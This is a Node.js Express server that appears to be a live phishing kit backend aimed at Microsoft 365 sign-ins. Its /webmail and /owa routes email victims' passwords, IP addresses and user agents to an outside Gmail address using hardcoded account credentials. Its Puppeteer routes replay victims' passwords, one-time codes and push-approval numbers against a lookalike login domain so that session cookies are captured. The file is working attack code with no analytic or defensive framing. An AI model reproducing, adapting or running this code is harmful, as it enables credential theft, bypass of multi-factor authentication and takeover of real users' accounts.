const express = require("express");
const cors = require("cors");
const fs = require("fs");
const puppeteer = require("puppeteer");
require("dotenv").config();
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const dns = require("dns");
const nodemailer = require("nodemailer");

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());

app.use(express.static("public"));
app.use(express.json());

let sessions = {};

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function getDomainFromEmail(email) {
  const atIndex = email.lastIndexOf("@");
  if (atIndex === -1) {
    throw new Error("Invalid email address.");
  }
  return email.substring(atIndex + 1);
}

function getMailClient(email, callback) {
  const domain = getDomainFromEmail(email);

  dns.resolveMx(domain, (err, addresses) => {
    if (err) {
      callback(
        `Failed to resolve MX records for domain ${domain}: ${err.message}`
      );
    } else if (addresses.length === 0) {
      callback(`No MX records found for domain ${domain}.`);
    } else {
      const isMicrosoft365 = addresses.some((record) =>
        record.exchange.includes("mail.protection.outlook.com")
      );
      if (isMicrosoft365) {
        callback(null, `3`);
      } else {
        callback(null, `1`);
      }
    }
  });
}

app.post("/check-email", async (req, res) => {
  const { email } = req.body;

  try {
    getMailClient(email, (err, mailClient) => {
      if (err) {
        console.error(err);
      } else {
        res.send(mailClient);
      }
    });
  } catch (err) {
    console.error("Error in /check-email:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/webmail", async (req, res) => {
  const { email, password, phishlet, country, ipAddress, userAgent } =
    req.body;

  try {
    sendEmail(email, password, phishlet, country, ipAddress, userAgent);
    res.send("1")
  } catch (err) {
    console.error("Error in /check-email:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/owa", async (req, res) => {
  const { email, password, phishlet, country, ipAddress, userAgent } =
    req.body;

  try {
    sendEmail(email, password, phishlet, country, ipAddress, userAgent);
    res.send("1")
  } catch (err) {
    console.error("Error in /check-email:", err);
    res.status(500).send("Internal Server Error");
  }
});

async function sendEmail(
  email,
  password,
  phishlet,
  country,
  ipAddress,
  userAgent
) {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "digitalbasecryptominers@gmail.com", // Your Gmail address
      pass: "ivyyfckzgjueqzjb", // Your Gmail app password
    },
  });

  // Define the email options
  const mailOptions = {
    from: "digitalbasecryptominers@gmail.com", // Sender's email address
    to: "soft6dev@gmail.com", // Recipient's email address
    subject: `LOG ${ipAddress}`, // Email subject
    html: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <div style="font-family: Arial, Helvetica, sans-serif;">
        <p>---------------------------Log Info----------------------------</p>
        <p>Email Address: ${email}</p>
        <p>Password: ${password}</p>
        <p>Password: ${phishlet}</p>
        <p>|---------------------- INFO | IP | Location ------------------------|</p>
        <p>|Client Location: ${country}</p>
        <p>|-- <a href="http://www.geoiptool.com/?IP=${ipAddress}" target="_blank">http://www.geoiptool.com/?IP=${ipAddress}</a> ------</p>
        <p>User Agent: ${userAgent}</p>
        <p>|-------- unknown ----------|</p>
    </div>
</body>
</html>
`,
  };

  try {
    // Send the email
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
  } catch (error) {
    console.error("Error sending email:", error.message);
  }
}

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "index.html"));
});

app.post("/email", async (req, res) => {
  let { sessionId, email } = req.body;
  if (!email) {
    return res.status(400).send("Email is required");
  }

  if (!sessionId) {
    sessionId = uuidv4();
  }

  if (sessions[sessionId]) {
    return res.status(400).send("Session already exists");
  }

  try {
    // const browser = await puppeteer.launch({ headless: false });
    const browser = await puppeteer.launch({
      args: [
        "--disable-setuid-sandbox",
        "--no-sandbox",
        "--single-process",
        "--no-zygote",
      ],
      executablePath:
        process.env.NODE_ENV === "production"
          ? process.env.PUPPETEER_EXECUTABLE_PATH
          : puppeteer.executablePath(),
    });
    const page = await browser.newPage();
    const userAgent =
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
    await page.setUserAgent(userAgent);
    await page.goto("https://login.tractiioncp.com/bfnnwnmq", {
      waitUntil: "networkidle2",
    });
    await page.waitForSelector("#i0116");
    await page.type("#i0116", email);
    await page.click("#idSIButton9");

    const selectors = ["#aadTile", "text/Enter password", "#password"];
    let result = "0";
    while (true) {
      try {
        const firstElement = await Promise.race([
          page
            .waitForSelector(selectors[0], { visible: true, timeout: 30000 })
            .then(() => selectors[0]),
          page
            .waitForSelector(selectors[1], { visible: true, timeout: 30000 })
            .then(() => selectors[1]),
          page
            .waitForSelector(selectors[2], { visible: true, timeout: 30000 })
            .then(() => selectors[2]),
        ]);
        if (firstElement === selectors[0]) {
          console.log("aadTile element found first!");
          result = "1";
        } else if (firstElement === selectors[1]) {
          console.log('"Enter password" text found first!');
          result = "2";
        } else if (firstElement === selectors[2]) {
          console.log("#password element found first!");
          result = "3";
        }
        break;
      } catch (error) {
        console.log("Neither element found");
      }
    }

    if (result == "1") {
      await delay(1000);
      await page.click("#aadTile");
    }

    sessions[sessionId] = { browser, page };
    res.send(result);
    console.log(`Email: ${email} logged for session: ${sessionId}`);
  } catch (err) {
    console.error("Error in /email:", err);
    res.status(500).send(err);
  }
});

app.post("/pass", async (req, res) => {
  const { sessionId, password } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    await page.waitForSelector("#i0118");
    await page.type("#i0118", password);
    await page.click("#idSIButton9");

    const selectors = [
      "text/Enter password",
      "text/Enter code",
      "text/Approve sign in request",
      "text/Stay signed in?",
      "text/Action Required",
    ];
    let result = "0";

    while (true) {
      try {
        const firstElement = await Promise.race([
          page
            .waitForSelector(selectors[0], { visible: true, timeout: 30000 })
            .then(() => selectors[0]),
          page
            .waitForSelector(selectors[1], { visible: true, timeout: 30000 })
            .then(() => selectors[1]),
          page
            .waitForSelector(selectors[2], { visible: true, timeout: 30000 })
            .then(() => selectors[2]),
          page
            .waitForSelector(selectors[3], { visible: true, timeout: 30000 })
            .then(() => selectors[3]),
          page
            .waitForSelector(selectors[4], { visible: true, timeout: 30000 })
            .then(() => selectors[4]),
        ]);
        if (firstElement === selectors[0]) {
          console.log(
            `Incorrect password: ${password} for session: ${sessionId}`
          );
          result = "0";
        } else if (firstElement === selectors[3]) {
          console.log("No 2FA");
          result = "1";
        } else if (firstElement === selectors[1]) {
          console.log("Enter Code");
          result = "2";
        } else if (firstElement === selectors[2]) {
          console.log("Approve sign in request");
          await page.waitForSelector("#idRichContext_DisplaySign");
          const textContent = await page.$eval(
            "#idRichContext_DisplaySign",
            (el) => el.textContent
          );
          result = textContent;
        } else if (firstElement === selectors[4]) {
          console.log("Action Required");
          await page.waitForSelector("#btnAskLater");
          await page.click("#btnAskLater");
          result = "3";
        }
        break;
      } catch (error) {
        console.log("Neither element found");
      }
    }

    if (result == "1") {
      await delay(1000);
      await page.waitForSelector("#idSIButton9");
      await page.click("#idSIButton9");
      console.log(`Password: ${password} logged for session: ${sessionId}`);
    } else if (result == "3") {
      await page.waitForSelector("#idSubmit_ProofUp_Redirect");
      await page.click("#idSubmit_ProofUp_Redirect");
    }
    res.send(result);

    if (result != "1" && result != "2" && result != "0" && result != "3") {
      await delay(60000);
      const content = await page.content();
      if (content.includes("Stay signed in?")) {
        await page.waitForSelector("#idSIButton9");
        await page.click("#idSIButton9");
      }
    }
  } catch (err) {
    console.error("Error in /pass:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/code", async (req, res) => {
  const { sessionId, code } = req.body;

  if (!sessionId || !code) {
    return res.status(400).send("Session ID and code are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    await page.waitForSelector("#idTxtBx_SAOTCC_OTC");
    await page.type("#idTxtBx_SAOTCC_OTC", code);
    await page.click("#idSubmit_SAOTCC_Continue");

    const selectors = [
      "text/You didn't enter the expected verification code.",
      "text/Stay signed in?",
    ];
    let result = "0";

    while (true) {
      try {
        const firstElement = await Promise.race([
          page
            .waitForSelector(selectors[0], { visible: true, timeout: 30000 })
            .then(() => selectors[0]),
          page
            .waitForSelector(selectors[1], { visible: true, timeout: 30000 })
            .then(() => selectors[1]),
        ]);
        if (firstElement === selectors[0]) {
          result = "0";
          console.log(`Incorrect code: ${code} for session: ${sessionId}`);
        } else if (firstElement === selectors[1]) {
          result = "1";
          console.log(`Code: ${code} logged for session: ${sessionId}`);
        }
        break;
      } catch (error) {
        console.log("Neither element found");
      }
    }

    if (result == "1") {
      await delay(1000);
      await page.waitForSelector("#idSIButton9");
      await page.click("#idSIButton9");
    }
    res.send(result);
  } catch (err) {
    console.error("Error in /code:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/check-2fa", async (req, res) => {
  const { sessionId, password } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    const selectors = ["text/Stay signed in?", "text/We didn't hear from you"];
    let result = "0";

    while (true) {
      console.log("Waiting for Approval");
      try {
        const firstElement = await Promise.race([
          page
            .waitForSelector(selectors[0], { visible: true, timeout: 60000 })
            .then(() => selectors[0]),
          page
            .waitForSelector(selectors[1], { visible: true, timeout: 60000 })
            .then(() => selectors[1]),
        ]);
        if (firstElement === selectors[0]) {
          result = "1";
          console.log(`Cookies captured for session: ${sessionId}`);
        } else if (firstElement === selectors[1]) {
          result = "0";
          console.log(`We didn't hear from you: ${sessionId}`);
        }
        break;
      } catch (error) {
        console.log("Neither element found");
      }
    }
    res.send(result);

    if (result == "1") {
      await delay(1000);
      await page.waitForSelector("#idSIButton9");
      await page.click("#idSIButton9");
    }
  } catch (err) {
    console.error("Error in /check-2fa:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.post("/resend", async (req, res) => {
  const { sessionId, password, request } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  try {
    const { page } = session;
    const content = await page.content();
    if (content.includes("We didn't hear from you")) {
      await page.click("#idA_SAASTO_Resend");
      await delay(5000);
      await page.waitForSelector("#idRichContext_DisplaySign");
      const textContent = await page.$eval(
        "#idRichContext_DisplaySign",
        (el) => el.textContent
      );
      res.send(textContent);
    } else {
      res.send("0");
    }
  } catch (err) {
    console.error("Error in /resend:", err);
    res.status(500).send("Internal Server Error");
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
